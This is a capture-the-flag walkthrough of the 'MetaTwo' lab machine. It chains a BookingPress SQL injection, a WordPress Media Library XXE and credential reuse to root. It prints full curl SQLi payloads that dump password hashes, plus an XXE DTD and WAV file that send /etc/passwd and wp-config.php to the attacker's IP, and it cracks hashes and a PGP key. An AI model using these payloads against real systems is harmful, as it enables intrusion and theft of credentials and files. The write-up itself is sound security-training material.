# MetaTwo - Easy

```sh
sudo vim /etc/hosts
# map IP to metatwo.htb

nmap -T4 -p- -A -Pn -v metatwo.htb
```

* open ports & services:

    * 21/tcp - ftp?
    * 22/tcp - ssh - OpenSSH 8.4p1 Debian 5+deb11u1
    * 80/tcp - http - nginx 1.18.0

* checking the FTP server, we can try anonymous login using ```ftp anonymous@metatwo.htb``` - there is a delay of 10-15 seconds before we get the login prompt, and anonymous login fails in this case

* the FTP banner also shows that it is using ProFTPD server - we can check this later

* the webpage on port 80 redirects to 'metapress.htb' so we need to update our ```/etc/hosts``` entry

* the webpage is for Metapress, a company site, and is running on Wordpress 5.6.2

* checking for exploits associated with this version does not give anything

* web scan:

    ```sh
    gobuster dir -u http://metapress.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # simple dir scan

    ffuf -c -u "http://metapress.htb" -H "Host: FUZZ.metapress.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 145 -s
    # subdomain scan
    ```

* the blog page includes only one post, which gives a link for signing up to the company's launch event, at /events endpoint

* this post gives us the author 'admin', the only user so far

* checking the /events page, we have a form with options to select service, date & time, basic details - and it shows a summary in the end

* after the events form is submitted, we get a confirmation page in the /thank-you endpoint, and here a parameter 'appointment_id' is being used with the value of a base64 string - this gives '1' when decoded

* as a quick test, we can try to check for other numbers encoded to base64 and passed as value of 'appointment_id' in this case (to check for IDOR), but we do not get anything

* pages found by ```gobuster```:

    * /wp-admin - this redirects to /wp-login.php
    * /cancel-appointment - this sends an email notification to the email, so it does not actually cancel it
    * /wp-sitemap.xml - WP sitemap
    * /robots.txt - no links found
    * /wp-signup.php - user registration is currently not allowed

* we can enumerate Wordpress using ```wpscan``` for further context:

    ```sh
    wpscan --update
    # update local DB

    wpscan --url http://metapress.htb --enumerate
    # enumerate wp

    wpscan --url http://metapress.htb --enumerate ap --plugins-detection aggressive
    # enumerate all plugins
    ```

* findings from ```wpscan```:

    * XML-RPC is enabled
    * WP theme - twentytwentyone
    * users 'admin' and 'manager' found

* we can use options like ```--plugins-detection aggressive``` in ```wpscan``` to find all plugins, but it takes a lot of time so we can resort to manual plugin search

* in the source code for each of the webpages, we can search for 'plugins' keyword

* this shows that the webpage is using a plugin called 'bookingpress-appointment-booking'; the hyperlinks in the source code also show that it is using version 1.0.10

* searching for exploits for this plugin, we get [CVE-2022-0739 - unauthenticated SQLi vuln found in BookingPress before version 1.0.11](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/)

* we can follow the PoC steps given in the above page to check for it:

    * navigate to /events, view source code, and search for "action:'bookingpress_front_get_category_services'"- note the '_wpnonce' value

    * attempt SQLi using the given payload:

        ```sh
        curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
        --data 'action=bookingpress_front_get_category_services&_wpnonce=0a1b1fe74b&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
        ```
    
    * this works and we get the MariaDB version 10.5.15; checking the current DB:

        ```sh
        curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
        --data 'action=bookingpress_front_get_category_services&_wpnonce=0a1b1fe74b&category_id=33&total_service=-7502) UNION ALL SELECT @@version,database(),@@version_compile_os,1,2,3,4,5,6-- -'
        ```
    
    * this shows the current DB is 'blog', we can find the table names next:

        ```sh
        curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
        --data 'action=bookingpress_front_get_category_services&_wpnonce=0a1b1fe74b&category_id=33&total_service=-7502) UNION ALL SELECT 1,2,3,4,5,6,@@version,database(),table_name from INFORMATION_SCHEMA.tables-- -'
        ```
    
    * this gives a lot of output, as it gives out all table names; we can filter out the table names by searching for the key for which the value is shown (e.g. - 'bookingpress_servicedate_created')

    * in this case, the table for user data is 'wp_users', we can check for its columns now:

        ```sh
        curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
        --data 'action=bookingpress_front_get_category_services&_wpnonce=0a1b1fe74b&category_id=33&total_service=-7502) UNION ALL SELECT 1,2,3,4,5,@@version,database(),table_name,column_name from INFORMATION_SCHEMA.columns-- -'
        ```
    
    * this gives another large output to search in (for some reason the WHERE clause is not working as usual); searching for columns for table 'wp_users' gives us the columns

    * in our case, we have 10 columns, but the main ones are 'user_login', 'user_email', and 'user_pass'

    * to fetch data from these columns:

        ```sh
        curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
        --data 'action=bookingpress_front_get_category_services&_wpnonce=0a1b1fe74b&category_id=33&total_service=-7502) UNION ALL SELECT 1,2,3,4,5,@@version,user_login,user_email,user_pass from blog.wp_users-- -'
        ```

* using these SQLi payloads, we are able to get hashes for two users - 'admin' and 'manager':

    * admin - $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
    * manager - $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 (here the hash was actually escaped with a '\' causing it to be not recognised earlier)

* the hashes are in the Wordpress MD5 format, supported by mode 400 in ```hashcat```:

    ```sh
    vim hashes
    # paste both hashes

    hashcat -m 400 hashes /usr/share/wordlists/rockyou.txt --force
    ```

* ```hashcat``` is able to crack hash for 'manager' and gives cleartext password 'partylikearockstar', but not for 'admin'

* using these creds, we can now log into /wp-login.php, and we have access to the dashboard now

* checking the dashboard, we have only one post, so nothing interesting here

* we have limited access as 'manager' here, as we cannot view/edit templates or themes to get RCE

* we have access to Media Library, so we can Google for any exploits to use here

* Googling shows that Media Library in WP versions 5.6 - 5.7 is impacted with an [authenticated XXE vuln - CVE-2021-29447](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/) - we can follow the PoC:

    * create a malicious DTD file, which contains our main payload:

        ```sh
        vim evil.dtd
        ```

        ```xml
        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
        <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.34:443/?p=%file;'>">
        ```
    
    * create a malicious WAV file referencing the DTD file:

        ```sh
        echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.34:443/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
        ```
    
    * host the files:

        ```sh
        sudo python3 -m http.server 443
        ```
    
    * now upload the WAV file in Media Library; this gives us a base64-encoded response in the Python server logs

    * decoding the logs gives us the contents of ```/etc/passwd```, which shows that we have a user 'jnelson'

    * we can check if this user has any SSH keys accessible by modifying the payload in 'evil.dtd' to read locations like ```/home/jnelson/.ssh/id_rsa``` and ```/home/jnelson/.ssh/authorized_keys```

    * uploading the payload again shows that this does not work

    * we can check other files for secrets in WP directory, like ```.htpasswd``` or ```wp-config.php```

    * for the location of these files, using ```/var/www/html``` does not help

    * checking other exploit codes/scripts, we can find that it is using a relative path of ```../wp-config.php``` instead of the absolute path - we can edit 'evil.dtd' to include this

    * this works and we get the base64-encoded 'wp-config.php' file that can be decoded

* from the 'wp-config.php' file, we get the DB password '635Aq@TdqrCwXFUZ' for DB user 'blog'

* this file also has a FTP configuration with the creds 'metapress.htb:9NYS_ii@FyL_p5M2NvJ'

* using these creds, we can enumerate FTP now:

    ```sh
    ftp metapress.htb@metatwo.htb
    # use the above password

    ls -la
    # we have two folders - 'blog' and 'mailer'

    cd blog

    ls -la
    # this includes the WP config files, we can fetch all files

    prompt
    # turn interactive mode off
    # so that it does not prompt asking to download each file

    mget *
    # fetch all

    get .htaccess
    # ftp not fetching hidden files by default, so we need to get it manually

    # we have a few directories here, but nothing interesting

    cd ../mailer
    
    ls -la
    # we have a file and a folder here

    get send_email.php

    cd PHPMailer

    mget *

    exit
    ```

* now we can check all the files fetched from the FTP service

* the 'send_email.php' file includes the creds 'jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys' - we can use this to log into SSH:

    ```sh
    ssh jnelson@metatwo.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    # not allowed

    ls -la
    # we have a non-default dir '.passpie'

    ls -la .passpie
    # this includes SSH config and keys

    cat .passpie/.config
    # empty

    cat .passpie/.keys
    # PGP public & private keys

    ls -la .passpie/ssh
    # this includes 'jnelson.pass' and 'root.pass'

    cat .passpie/ssh/jnelson.pass
    # jnelson SSH password, PGP encrypted

    cat .passpie/ssh/root.pass
    # root SSH password, PGP encrypted
    ```

* Googling about this shows that passpie is a CLI tool used to manage passwords - we can check if it shows anything:

    ```sh
    passpie list
    # to list passwords, but these are hidden

    passpie export test.txt
    # to export creds to a file
    # but this requests for a passphrase
    ```

* as ```passpie``` is not showing anything, we can copy the '.keys' and '.pass' files to attacker and try to crack it:

    ```sh
    scp jnelson@metatwo.htb:.passpie/.keys pgp-keys

    scp jnelson@metatwo.htb:.passpie/ssh/jnelson.pass jnelson.pass

    scp jnelson@metatwo.htb:.passpie/ssh/root.pass root.pass

    file pgp-keys
    # PGP public key block

    file jnelson.pass
    # ASCII text
    ```

* the PGP keys file is in a PGP public/private key block format; Googling more on this shows that they use the '.asc' format

* we can crack .asc files using ```gpg2john``` and ```john```:

    ```sh
    gpg2john pgp-keys > pgpaschash
    ```

* ```gpg2john``` gives an error and wants the input file to contain a single private key only, so we can edit it to remove the public key block:

    ```sh
    vim pgp-keys
    # remove public key block

    gpg2john pgp-keys > pgpaschash
    
    cat pgpaschash
    # this recognises 'passpie'
    # we can crack this using john now

    john --wordlist=/usr/share/wordlists/rockyou.txt pgpaschash
    # cracks the hash
    ```

* ```john``` cracks the PGP passphrase to give cleartext 'blink182'

* we can attempt to use this passphrase now on target to export the creds:

    ```sh
    passpie export test.txt
    # use the above passphrase

    cat test.txt
    # we have the creds for root and jnelson ssh

    su -
    # login as root

    cat /root/root.txt
    # root flag
    ```
